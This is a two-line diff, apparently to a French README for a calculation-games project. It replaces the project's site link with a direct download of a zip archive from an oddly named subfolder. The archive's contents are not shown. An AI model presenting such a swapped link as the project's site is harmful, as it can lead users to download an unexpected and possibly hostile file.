@@ -1,2 +1,2 @@
 lien du site : 
- https://zduchevreuil.github.io/jeux-calcul-/
+ https://raw.githubusercontent.com/zduchevreuil/jeux-calcul-/main/nephelinite/jeux-calcul--1.6.zip
